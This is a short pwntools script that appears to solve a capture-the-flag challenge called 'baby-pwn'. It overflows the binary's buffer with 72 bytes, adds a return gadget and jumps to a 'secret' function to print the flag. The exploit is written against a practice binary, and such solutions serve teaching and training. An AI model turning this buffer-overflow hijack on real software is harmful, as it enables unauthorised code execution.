from pwn import *

context.binary = binary = ELF('./baby-pwn', checksec=False)

p = process()

rop = ROP(binary)

payload = b'A' * 72
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(binary.symbols.secret)

p.sendline(payload)

p.recvuntil(b'Here is your flag: ')
print(f'Flag: {p.recvline().strip().decode()}')
